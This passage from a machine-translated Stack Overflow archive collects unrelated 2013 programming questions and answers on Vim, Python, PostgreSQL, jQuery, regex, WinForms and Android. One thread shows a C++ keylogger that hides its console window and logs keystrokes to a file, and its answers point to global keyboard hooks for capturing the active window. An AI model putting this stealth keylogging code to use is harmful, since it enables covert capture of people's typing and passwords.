(0x1f38012 0x1854e7e 0x1fc34bd 0x1f27bbc 0x1f2794e 0x75385a 0x75299b 0x7540df 0x756d2d 0x756cac 0x74ea28 0x4bb972 0x4bbe53 0x499d4a 0x48b698 0x1e93df9 0x1e93ad0 0x1eadbf5 0x1ead962 0x1edebb6 0x1eddf44 0x1edde1b 0x1e927e3 0x1e92668 0x488ffc 0x1fbd 0x1ee5 0x1)
libc++abi.dylib: terminate called throwing an exception 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:55:30.293

你需要改变：

```
UITapGestureRecognizer *tapTwice = [[UITapGestureRecognizer alloc] initWithTarget:self  action:@selector(tapTwice)]; 
```

到：

```
 UITapGestureRecognizer *tapTwice = [[UITapGestureRecognizer alloc] initWithTarget:self  action:@selector(tapTwice:)]; 
```

方法 tapTwice: 接受一个参数。

# vim - Vim：拉远线而不移动

> ID：15392729
> 
> 赞同：4
> 
> 时间：2013-03-13T17:48:57.063
> 
> 标签：vim

假设我有以下（* =光标）：

```
...
*
Kittens
Puppies
Humans
... 
```

如何在将光标留在原位的同时拉动“人类”（光标相对于第 3 行）？

最好在一个动作或一个（通用）命令中。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-13T17:54:31.153

试试这个：

```
:+3y 
```

它使用 range `+3`，即它将开始拉动的点。默认情况下它只做一行。

**更新**：如果您想在不移动光标的情况下复制第二行和第三行，您将使用相同的命令，但范围为两点，例如：

```
:+2,+3y 
```

它会同时复制`Puppies`和`Humans`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-02-06T01:59:50.510

现在，对于那些想知道的人，根据Birei的回答，您也可以这样做`:ny`，`n`您要抽出的行号在哪里。这实际上是我在访问此页面时正在寻找的内容，如果您已经开始`set number`并且不想计算相对行数，这将很有帮助。

现在，我想知道如何对特定寄存器执行此拉动！:D

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-14T07:58:34.050

我的[LineJuggler 插件](http://www.vim.org/scripts/script.php?script_id=4140)结合了 yanks 并放入了各种短映射；例如，`3[f`您可以在当前行下方获取第 3 行并将其放在当前行下方。

# python - 在 Python 中，打印字符串时是否可以转义换行符？

> ID：15392730
> 
> 赞同：68
> 
> 时间：2013-03-13T17:48:59.600
> 
> 标签：python, escaping, newline

`\n`我希望在打印从其他地方检索到的字符串时显式显示换行符。因此，如果字符串是 'abc\ndef' 我不希望这种情况发生：

```
>>> print(line)
abc
def 
```

但取而代之的是：

```
>>> print(line)
abc\ndef 
```

有没有办法修改打印，或者修改参数，或者完全是另一个函数来完成这个？

* * *

## 回答 #1

> 赞同：115
> 
> 时间：2013-03-13T17:49:52.307

只需使用编解码器对其进行`'string_escape'`编码。

```
>>> print "foo\nbar".encode('string_escape')
foo\nbar 
```

在 python3 中，`'string_escape'`已成为`unicode_escape`. 此外，我们需要更加小心字节/unicode，因此它涉及编码后的解码：

```
>>> print("foo\nbar".encode("unicode_escape").decode("utf-8")) 
```

[unicode_escape 参考](https://docs.python.org/3/library/codecs.html#text-encodings)

* * *

## 回答 #2

> 赞同：61
> 
> 时间：2013-03-13T17:59:34.217

使用转义字符停止 python 的另一种方法是使用如下的原始字符串：

```
>>> print(r"abc\ndef")
abc\ndef 
```

或者

```
>>> string = "abc\ndef"
>>> print (repr(string))
>>> 'abc\ndef' 
```

using 的唯一问题`repr()`是它将您的字符串放在单引号中，如果您想使用引号，它会很方便

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2013-03-13T18:26:50.640

最简单的方法： `str_object.replace("\n", "\\n")`

如果您想显示*所有*转义字符，其他方法会更好，但如果您只关心换行符，只需使用直接替换。

# c++ - C++ 简单的键盘记录器

> ID：15392731
> 
> 赞同：4
> 
> 时间：2013-03-13T17:49:02.137
> 
> 标签：c++, winapi, keylogger

我正在尝试使用 WinAPI 在 C++ 中编写一个简单的键盘记录器。有没有办法让用户在哪个应用程序中键入捕获的击键？到目前为止，这是我的代码：

```
#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

int main()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
    char i;

while (1)
{
    for(i = 8; i <= 190; i++)
    {
        if (GetAsyncKeyState(i) == -32767)
        {
            FILE *OUTPUT_FILE;
            OUTPUT_FILE = fopen("LOG.txt", "a+");
            int c=static_cast<int>(i);
            fprintf(OUTPUT_FILE, "%s", &c);
            fclose (OUTPUT_FILE);
        }
    }
}
system ("PAUSE");
return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T18:04:16.827

你想要的是一个[全局键盘钩子](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644959%28v=vs.85%29.aspx)

> 全局挂钩监视与调用线程相同的桌面中的所有线程的消息。特定于线程的挂钩仅监视单个线程的消息。全局挂钩过程可以在与调用线程相同的桌面中的任何应用程序的上下文中调用，因此该过程必须位于单独的 DLL 模块中。仅在关联线程的上下文中调用特定于线程的钩子过程。如果应用程序为其自己的线程之一安装挂钩过程，则挂钩过程可以与应用程序的其余代码位于同一模块中，也可以位于 DLL 中。如果应用程序为不同应用程序的线程安装挂钩过程，则该过程必须在 DLL 中。有关信息，请参阅动态链接库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-17T20:48:19.727

由于问题是“有没有办法让用户在哪个应用程序中键入捕获的击键？” 我会说使用 HWND WINAPI GetForegroundWindow(void);

例如：

```
char cWindow[MAX_PATH];
GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow)); 
```

在 cWindow 中，您可以获得用户正在输入的窗口的标题。

# ios - GameCenter（成就）在应用商店启动后？

> ID：15392736
> 
> 赞同：0
> 
> 时间：2013-03-13T17:49:19.420
> 
> 标签：ios, game-center

试图推出一些东西，但想确保如果 GameCenter 是 V2 功能，我们可以在游戏已经发布并在 App Store 中添加它。是否可以在不强迫人们发现和下载全新应用程序的情况下将其作为游戏应用程序的更新版本进行推送？

很难找到答案，只是想确保这是我们可以推迟的事情。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-13T18:03:03.317

是的，您可以在同一应用中为其下一个版本添加成就。根本不是问题。您的用户将收到更新可用的通知，一旦他们更新他们将具有功能。无需制作单独的应用程序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T18:05:05.097

是的。可以添加 Game Center、应用内购买和未来更新推送通知等功能。

# ios - 如何在xcode中链接框架的源代码

> ID：15392741
> 
> 赞同：0
> 
> 时间：2013-03-13T17:49:30.460
> 
> 标签：ios, xcode, ios-frameworks

我的项目中有一个框架。

我最近获得了 git 访问代码的权限。有什么方法可以将源链接到该框架，所以当我单步执行断点时，它会显示代码而不是汇编指令？

我想这样做而不必重建框架。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:38:22.723

你有两个选择：

1）克隆项目，并将框架项目添加到您的项目中。

2) 确保基础项目在构建时启用了“带有 dSYM 文件的 DWARF”，未从二进制文件中删除符号，并且 dSYM 文件保存在包含的框架中。

我的猜测是原作者没有做第二个选项，所以你的选项是第一个。

# database - 如何自动化函数和视图的 postgress 导入和导出

> ID：15392743
> 
> 赞同：1
> 
> 时间：2013-03-13T17:49:35.130
> 
> 标签：database, postgresql

我有一些使用 PostgreSQL 数据库的项目，它使用 19 个存储过程（函数）和大约 70 个视图。

现在，我们对实时数据库进行了一些更新，并且由于 postgres 的限制以及需要删除和重新创建所有函数和视图，函数发生了变化，我们花了相当长的时间来做这件事。

是否有一种自动化的方式来改变 postgress 中的函数和视图，以一种关心依赖关系并以正确的顺序执行的方式。

我们有基本视图，然后创建上层视图......它有点复杂的数据库，至少对我来说:)

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T20:13:23.187

我认为最简单的方法是将数据库备份到文本文件：

```
pg_dump database_name > database_name.pg_dump 
```

它们将处于正确的依赖顺序中，否则从备份中恢复数据库将很困难。您可以编辑备份文件中的函数和视图定义并将其恢复到新数据库。

如果数据库备份文件太大而无法在编辑器中编辑，从 Postgres 9.2 开始，您可以将其拆分为 3 个部分：

```
pg_dump --section=pre-data > database_name.1.pg_dump
pg_dump --section=data > database_name.2.pg_dump
pg_dump --section=post-data > database_name.3.pg_dump 
```

您将只编辑第一部分，该部分很小。在旧版本中，您可以使用例如[`split`](http://unixhelp.ed.ac.uk/CGI/man-cgi?split)实用程序。

如果您负担不起备份和恢复所需的停机时间，那将变得更加棘手。但我仍然建议使用备份文件。请记住 Postgres 在事务中支持 DDL — 如果您在事务中导入函数和视图并且会出现错误，您可以简单地回滚所有更改，进行更正并重试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-18T14:04:50.767

没有“简单”的方法。IMO 最好的方法是首先做好准备，然后使用 SQL 脚本和版本控制来设置方法。

我们在 LedgerSMB 中所做的是将函数定义保存在一系列 .sql 文件中，这些文件在 subversion 中进行跟踪。然后我们有一个重新加载它们的脚本。如果您以前没有这样做，这将需要一些工作来设置。最简单的方法是：

```
pg_dump -s > ddl_statements_for_mydb.sql 
```

然后您可以复制/粘贴函数定义（将 CREATE 更改为 CREATE OR REPLACE 或在适当的地方添加 DROP IF EXISTS）。然后你会想要模块化成可用的块，并有一个脚本以正确的顺序将所有块重新加载到你的数据库中。现在设置所有内容所花费的时间和精力将在未来节省很多倍，因为您可以以可预测的方式将更改应用到测试、暂存和生产帐户，而没有明显的停机时间（甚至可能根本没有停机时间，具体取决于如何你构建它）。

# jquery - jQuery 显示两个 html 都不能与 $.ajax 一起使用？

> ID：15392749
> 
> 赞同：1
> 
> 时间：2013-03-13T17:49:42.760
> 
> 标签：jquery, ajax

```
<form method="post" action="#" name="sign-up" id="sign-up">
<label for="name">Name:</label>
<input type="text" id="name" name="name">
<label for="last-name">Last Name:</label>
<input type="text" id="last-name" name="last-name">
<label for="age">Age:</label>
<input type="text" id="age" name="age">
<label for="email">Email:</label>
<input type="email" id="email" name="email">
<input type="submit" value="Verify" id="submit-form">
  </form>
<div id="result"></div>
<script>

(function() {
$('form').on('submit',function(e) {
e.preventDefault();
$('#verify').slideUp();
    $.ajax({
    type: "POST",
    url:"https://externalhost/file.php",//not the actual host
    data: $('form').serialize(),
    success: function(result) {
    $('#result').html(result); }
    });
});

})(); 
```

如您所见，我正在尝试为我的访问者制作订阅表格，但我遇到了麻烦。

首先，我无法检查是否所有字段都已完成，因为它正在显示结果，例如使用 .show()。

其次，$.ajax 形式它自己正在工作，我正在接收所有信息以及它在 MySql 中注册的所有内容，因此通过 $.ajax 调用的外部文件也很好，但结果它没有显示出来。

此外，这将是一个 Facebook 应用程序，但它也不能在 Facebook 上运行：/

谁能帮助我，我在这里做错了什么？

编辑：

虽然标记中的 # 是一个错误，但我修复了它，但它再次不起作用：/

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:51:37.110

您的标记中有错误：

```
<div id="#result"></div> 
```

应该

```
<div id="result"></div> 
```

如果你`result`是一个对象，使用`html()`将不起作用。但是，您可以拥有一个`each()`循环遍历每个对象属性并将值附加到您的`#result`div 的函数。

```
$.each(result, function(key, element) {
  $("#result").append(key + ": " + element + "<br />");
}); 
```

见[演示](http://jsfiddle.net/yn2Rr/2/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T18:19:31.700

您必须将 jQuery 传递给您的自调用函数。你可以这样做...

```
(function($) {
...

})(jQuery); 
```

并确保在所有开始之前将脚本文件加载到页面上的某个地方

# struts - 如何在struts中找到修改后的ActionForm bean

> ID：15392751
> 
> 赞同：0
> 
> 时间：2013-03-13T17:49:43.493
> 
> 标签：struts

我在 struts 1.2 框架中有一个要求，我的表单中有 50 到 60 个字段，我只需要更新 3 个字段（由用户更改），所以当我提交表单时，只有这 3 个字段需要更新在数据库中。

如何识别 struts ActionForm 中 50 个字段中的 3 个更改/修改字段。您的建议非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T01:49:58.810

没有办法做到这一点，因为当您提交表单时，您正在提交所有字段（有时除了复选框）。

您可以使用 javascript 和 ajax 来发布您想要更改的值。在您的字段上设置事件处理程序以检测用户更改了它们并仅发布您更改的字段。这样做的问题是，如果您走那条路线，您只能使用 javascript 提交“表单”。

就我个人而言，我要做的是创建一个 javabean，您可以从您的表单中填充它，该表单仅包含您正在检查的 3 个字段是否已更改。从数据库中获取当前数据（或者如果您不想再次查询，您可以使用会话属性）并使用该数据填充您的 javabean 的另一个实例。比较两个 bean 以查看字段是否相等。根据您要比较的 bean 的相等性处理表单的其余部分。

或者，只要您使用 actionform 来填充开始的字段，请将用户提交的 actionform 与另一个填充了新数据的 actionform 进行比较，以确定您实际需要保留的内容。

# gem - 尝试安装捆绑程序时，我该怎么做才能解决此错误？

> ID：15392752
> 
> 赞同：0
> 
> 时间：2013-03-13T17:49:44.320
> 
> 标签：gem, installation, rvm, bundler

我正在尝试运行此命令

```
gem install bundler 
```

但我总是收到这个错误：

```
ERROR:  Loading command: install (LoadError)
        cannot load such file -- openssl
ERROR:  While executing gem ... (NoMethodError)
        undefined method `invoke_with_build_args' for nil:NilClass 
```

我能做些什么呢？我已经尝试过这个（正如这里指出[的'gem install bundle'出错了](https://stackoverflow.com/questions/10070830/gem-install-bundle-get-something-wrong)）：

```
rvm pkg install zlib
rvm remove 2.0.0 
rvm install 2.0.0 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-13T17:57:04.817

这是一个已知问题 - ruby​​gems 2.0.0 需要 openssl，运行以下命令：

```
rvm get head
rvm reinstall 2.0.0 --autolibs=3 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-08T14:41:54.867

如果您使用的是 Cygwin，请尝试使用安装程序重新安装 ruby​​ 软件包。即使它们是相同的版本。

# regex - 只匹配一个模式一次

> ID：15392753
> 
> 赞同：7
> 
> 时间：2013-03-13T17:49:45.680
> 
> 标签：regex, lookahead, find-occurrences

我有一个字符串

```
foo-bar-bat.bla 
```

我只想匹配`foo`

我有缺陷的模式同时匹配`foo`和`bar`

```
\w+(?=-.*\.bla) 
```

我该如何丢弃`bar`？或者甚至更好，我怎么能在之后停止匹配东西`foo`？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-13T17:51:11.510

您可以使用以下模式（只要您的字符串始终按照您所说的方式格式化）：

```
^\w+(?=-.*\.bla) 
```

![正则表达式图片](../Images/9027de95fa0f2b19a1d01f9d4b2b5419.png)

[在 Debuggex 上实时编辑](http://www.debuggex.com/r/EkIvhuQ8TmetiL5q)

符号匹配字符串的`^`开头。因此将采用字符串的第一个匹配项。

*这`?=`旨在确保未捕获但存在跟随的组。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:55:29.060

```
^[^-]+ 
```

起始`^`意味着从字符串的开头开始匹配。字符`[^-]`组意味着搜索任何不是破折号的东西。这`+`意味着字符组应该匹配一个字符一次或多次。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T18:19:29.367

表达式的“.*”部分与“bar”匹配。

`^\w+(?=-.*)`

此表达式读作“在字符串的开头，至少有一个字符后跟（但不包括在匹配中）一个 DASH 后跟任何内容”

```
^ \w+ (?=-.*)
|  |    |
|  |   matches "-bar-bat.bla"
|  matches "foo"
start of string 
```

# .net - GroupStyle 与 WrapPanel 没有间隙

> ID：15392760
> 
> 赞同：1
> 
> 时间：2013-03-13T17:49:57.973
> 
> 标签：.net, wpf, xaml, wrappanel

使用 WPF 的默认实现，是否可以创建使用 WrapPanel 的 GroupItems 而无需分离 GroupItems？

例如，您可以在下面看到明显的分组。但是，新组将始终位于“新列”中。 ![在此处输入图像描述](../Images/bf72e3127cfdf696433859f5ed256029.png)

这是视觉树。发生这种情况的原因很明显，但我想知道是否有可能创建一个支持无缝/无缝包装的面板，所以感觉它们并不完全是一个单独的列表。

![在此处输入图像描述](../Images/fcc9edde363cc7e610638858246d4f28.png)

我认为可能的一种实现是不在视觉级别而是在数据级别进行分组。它已经在 CollectionViewSource 中分组，但我可以在 ItemTemplate 中做一些事情来直观地对它们进行分组。这感觉有点骇人听闻，只满足极少数的边缘情况。谢谢阅读！

# php - 在字符串php中获取日期

> ID：15392761
> 
> 赞同：2
> 
> 时间：2013-03-13T17:50:01.103
> 
> 标签：php, date

我正在尝试从 php 中的句子中获取日期。例如

我试图让 2006 年 10 月 8 日离开

“这座建筑在一场大风暴之后于 2006 年 10 月 8 日进行了清理。”

它有一个 github 函数 [https://github.com/etiennetremel/PHP-Find-Date-in-String](https://github.com/etiennetremel/PHP-Find-Date-in-String)但它在 2012 年 1 月 5 日等日期失败。

我意识到，鉴于日期字符串的不同性质，在字符串中查找日期字符串比仅针对特定格式的简单 REGEX 或简单地对给定字符串输入进行 strototiming 困难得多。

有人有什么好主意吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:53:38.440

我不认为有一个可行的解决方案，因为 2010 年 10 月 8 日并没有说明太多......它可能是 10 天或一个月......我认为你可以继续使用你的正则表达式 :)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:59:18.840

首先，我会先寻找一些基本模式，然后用几遍正则表达式提取它们（mm/dd/yy 和 mm/dd/yyyy with `\d{2]/\d{2}/\d{2,4}`，然后寻找其他模式，例如`\d{1,2}(th|st|rd)? Jan(uary)?|Feb(ruary)?|Mar(ch)?|Apr(il)?|May|Jun(e)?|Jul(y)?|Aug(ust)?|Sep(tember)?|Oct(ober)|Nov(ember)?|Dec(ember)`等）

几乎可以肯定的是，编写几个正则表达式并逐次完成比编写一个庞大的正则表达式要快。

然后，传递您提取的内容`strtotime`以获得可用的 unix 时间戳，并从中获取所需的内容。

注意事项：

*   我没有尝试过正则表达式，有明显的优化
*   假设您的日期将始终为美国风格（mm/dd/yy，而不是 dd/mm/yy）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:58:07.810

我认为使用正则表达式会更简单。问题是日期的书写方式有很多选择。

# vb.net - 为什么绑定到一组 Winforms 级联组合框会导致根组合框无法正确设置其值？

> ID：15392762
> 
> 赞同：1
> 
> 时间：2013-03-13T17:50:06.647
> 
> 标签：vb.net, winforms, data-binding, binding, combobox

我有一个带有两个组合框的 Windows 窗体。每个组合框的`SelectedValue`属性都是绑定到简单 DTO 上的属性的数据。每个组合框的选项都来自模型对象列表。我只需要表单上的控件来更新 DTO；我不需要以编程方式修改任何 DTO 的属性并查看正在更新的相应控件 - 即，我只需要单向（控件 -> 源）数据绑定即可工作。

当用户更改第一个组合框的值时，第二个组合框的选项将完全改变。但是，我在此设置中遇到了两个问题，我无法弄清楚它们发生的原因或如何解决它们：

1.  每当更改第一个组合框时，数据绑定框架就会生成并吞下 NRE（我可以在 Visual Studio IDE 的即时窗口中看到它抛出），这提示我某些设置不正确。更改第二个组合框或任何其他不相关的数据绑定控件（组合框或其他）不会生成 NRE。
2.  同样，每当第一个组合框发生变化时，在生成上述 NRE 后，第二个组合框加载成功，但第一个组合框的选定索引重置为 -1。我怀疑这是因为数据绑定的“推送”事件触发以更新控件，并且由于某种原因，支持第一个组合框的 DTO 属性的值被重置为 NULL/Nothing。

有谁知道为什么会发生这些事情？我模拟了我的问题，它展示了上述两个问题。我还添加了第三个组合框，它与前两个中的任何一个都没有关系，就像一个完整性检查以表明一个不依赖于另一个组合框的组合框可以正常工作。

此代码复制了问题 - 粘贴为 Visual Basic Windows 窗体项目（3.5 框架）的默认 Form1 类的代码。

```
Imports System
Imports System.Collections.Generic
Imports System.Linq
Imports System.Windows.Forms

Public Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.cboA = New System.Windows.Forms.ComboBox()
        Me.cboB = New System.Windows.Forms.ComboBox()
        Me.cboC = New System.Windows.Forms.ComboBox()
        Me.SuspendLayout()
        '
        'cboA
        '
        Me.cboA.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.cboA.FormattingEnabled = True
        Me.cboA.Location = New System.Drawing.Point(120, 25)
        Me.cboA.Name = "cboA"
        Me.cboA.Size = New System.Drawing.Size(121, 21)
        Me.cboA.TabIndex = 0
        '
        'cboB
        '
        Me.cboB.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.cboB.FormattingEnabled = True
        Me.cboB.Location = New System.Drawing.Point(120, 77)
        Me.cboB.Name = "cboB"
        Me.cboB.Size = New System.Drawing.Size(121, 21)
        Me.cboB.TabIndex = 1
        '
        'cboC
        '
        Me.cboC.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.cboC.FormattingEnabled = True
        Me.cboC.Location = New System.Drawing.Point(120, 132)
        Me.cboC.Name = "cboC"
        Me.cboC.Size = New System.Drawing.Size(121, 21)
        Me.cboC.TabIndex = 2
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(284, 262)
        Me.Controls.Add(Me.cboC)
        Me.Controls.Add(Me.cboB)
        Me.Controls.Add(Me.cboA)
        Me.Name = "Form1"
        Me.Text = "Form1"
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents cboA As System.Windows.Forms.ComboBox
    Friend WithEvents cboB As System.Windows.Forms.ComboBox
    Friend WithEvents cboC As System.Windows.Forms.ComboBox

    Private _DataObject As MyDataObject
    Private _IsInitialized As Boolean = False

    Public Sub New()
        ' This call is required by the Windows Form Designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.
        _DataObject = New MyDataObject()
        BindControls()
    End Sub

    Private Sub BindControls()
        LoadComboA(cboA)
        Dim cmbABinding As New Binding("SelectedValue", _DataObject, "ValueA", True, DataSourceUpdateMode.OnPropertyChanged)
        cboA.DataBindings.Add(cmbABinding)

        Dim cmbBBinding As New Binding("SelectedValue", _DataObject, "ValueB", True, DataSourceUpdateMode.OnPropertyChanged)
        cboB.DataBindings.Add(cmbBBinding)

        LoadComboC(cboC)
        Dim cmbCBinding As New Binding("SelectedValue", _DataObject, "ValueC", True, DataSourceUpdateMode.OnPropertyChanged)
        cboC.DataBindings.Add(cmbCBinding)
    End Sub

    Protected Overrides Sub OnLoad(ByVal e As System.EventArgs)
        MyBase.OnLoad(e)
        _IsInitialized = True
        cboA.SelectedIndex = 0
        cboC.SelectedIndex = 0
    End Sub

    Private Sub ComboA_SelectedValueChanged(ByVal sender As Object, ByVal e As EventArgs) Handles cboA.SelectedValueChanged
        If _IsInitialized Then
            LoadComboB(cboB, cboA.SelectedValue.ToString())
            cboB.SelectedIndex = 0
        End If
    End Sub

    Private Sub LoadComboA(ByVal cmbBox As ComboBox)
        Dim someData As New Dictionary(Of String, String)()
        someData.Add("Value1", "Text 1")
        someData.Add("Value2", "Text 2")
        someData.Add("Value3", "Text 3")
        cmbBox.DataSource = someData.ToList()
        cmbBox.DisplayMember = "Value"
        cmbBox.ValueMember = "Key"
    End Sub

    Private Sub LoadComboB(ByVal cmbBox As ComboBox, ByVal selector As String)
        Dim someSubData As New Dictionary(Of String, String)()
        Select Case selector
            Case "Value1"
                someSubData.Add("SubValue1", "Value1 - Sub Text 1")
                someSubData.Add("SubValue2", "Value1 - Sub Text 2")
                someSubData.Add("SubValue3", "Value1 - Sub Text 3")
            Case "Value2"
                someSubData.Add("SubValue4", "Value2 - Sub Text 4")
                someSubData.Add("SubValue5", "Value2 - Sub Text 5")
                someSubData.Add("SubValue6", "Value2 - Sub Text 6")
            Case "Value3"
                someSubData.Add("SubValue7", "Value3 - Sub Text 7")
                someSubData.Add("SubValue8", "Value3 - Sub Text 8")
                someSubData.Add("SubValue9", "Value3 - Sub Text 9")
        End Select
        cmbBox.DataSource = someSubData.ToList()
        cmbBox.DisplayMember = "Value"
        cmbBox.ValueMember = "Key"
    End Sub

    Private Sub LoadComboC(ByVal cmbBox As ComboBox)
        Dim someData As New Dictionary(Of String, String)()
        someData.Add("Value100", "Text 100")
        someData.Add("Value101", "Text 101")
        cmbBox.DataSource = someData.ToList()
        cmbBox.DisplayMember = "Value"
        cmbBox.ValueMember = "Key"
    End Sub

End Class

Public Class MyDataObject  ' DTO class

    Private _ValueA As String
    Public Property ValueA() As String
        Get
            Return _ValueA
        End Get
        Set(ByVal value As String)
            _ValueA = value
        End Set
    End Property

    Private _ValueB As String
    Public Property ValueB() As String
        Get
            Return _ValueB
        End Get
        Set(ByVal value As String)
            _ValueB = value
        End Set
    End Property

    Private _ValueC As String
    Public Property ValueC() As String
        Get
            Return _ValueC
        End Get
        Set(ByVal value As String)
            _ValueC = value
        End Set
    End Property

End Class 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T02:19:25.783

当 DataBinding 行为不端时，它可能难以调试。这里有两件事出了问题，足以使其难以诊断。您没有想到的第一件事是 SelectedValueChanged 事件*在*货币管理器更新绑定对象之前触发。这通常不是问题，但您的事件处理程序有副作用。下一件事是，更改绑定对象的*一个*​​属性会导致所有*其他*属性的绑定也被更新。

问题是，当您更新组合 B 时，_DataObject.ValueA 仍然是 Nothing。这会更新 _DataObject.ValueB。因此货币经理*再次*更新组合 A ，试图使其与属性 ValueA 中 Nothing 的值匹配。这也是产生 NullReferenceException 的原因。

一种可能的解决方法是延迟 SelectedValueChanged 事件处理程序中的副作用并将其推迟到货币管理器更新绑定对象为止。通过使用 Control.BeginInvoke() 可以干净地完成，目标在 UI 线程再次空闲时运行。这解决了您的问题：

```
Private Sub ComboA_SelectedValueChanged(ByVal sender As Object, ByVal e As EventArgs) Handles cboA.SelectedValueChanged
    If _IsInitialized Then Me.BeginInvoke(New MethodInvoker(AddressOf LoadB))
End Sub

Private Sub LoadB()
    LoadComboB(cboB, cboA.SelectedValue.ToString())
    cboB.SelectedIndex = 0
End Sub 
```

可能有一个更干净的修复，更新 _DataObject 而不是尝试更新组合框。但是您使用字典使这有点困难，我没有追求它。

# java - 闪烁屏幕活动 Android

> ID：15392763
> 
> 赞同：0
> 
> 时间：2013-03-13T17:50:09.980
> 
> 标签：java, android

我正在尝试测试一些东西，但我需要的只是一个以 1 秒的间隔在黑白屏幕之间闪烁的活动。我看过 postDelayed，但我仍然不确定我将如何实现它。这就是我现在所拥有的，但它不会“闪烁”

主要活动：

```
import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.view.Menu;

public class Blink extends Activity {
    int i = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_blink);

        while (i == 0) {
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                public void run() {
                    changeColor();
                }
            }, 1000);
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    public void changeColor() {
        if (findViewById(R.id.mylayout).getBackground().equals("#ffffff")) {
            findViewById(R.id.mylayout).setBackgroundResource(Color.BLACK);
        } else {
            findViewById(R.id.mylayout).setBackgroundResource(Color.WHITE);

        }
    }
} 
```

## 更新代码：

```
import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.view.Menu;

public class Blink extends Activity {
    int i = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_blink);

        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            public void run() {
                changeColor();
            }
        }, 1000);

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    public void changeColor() {
        if (i == 0) {
            findViewById(R.id.mylayout).setBackgroundColor(Color.WHITE);
            i++;
        } else if (i == 1) {
            findViewById(R.id.mylayout).setBackgroundColor(Color.BLACK);
            i--;

        }
    }
} 
```

## 更新 2：

```
import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.view.Menu;

public class Blink extends Activity {
    int i = 0;
    Boolean bool = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_blink);

        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            public void run() {
                changeColor();
            }
        }, 1000);

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    public void changeColor() {
        if (bool) {
            findViewById(R.id.mylayout).setBackgroundColor(Color.WHITE);
            bool = false;
        } else {
            findViewById(R.id.mylayout).setBackgroundColor(Color.BLACK);
            bool = true;

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T22:29:37.223

我缩小了我应该在这里问的确切问题：[为什么这个 postDelayed 不能永远运行？](https://stackoverflow.com/questions/15397587/why-doesnt-this-postdelayed-run-forever/15397621?noredirect=1#15397621)

要修复此代码，我所要做的就是在`handler.postDelayed(this, 1000);`run.xml 中添加。

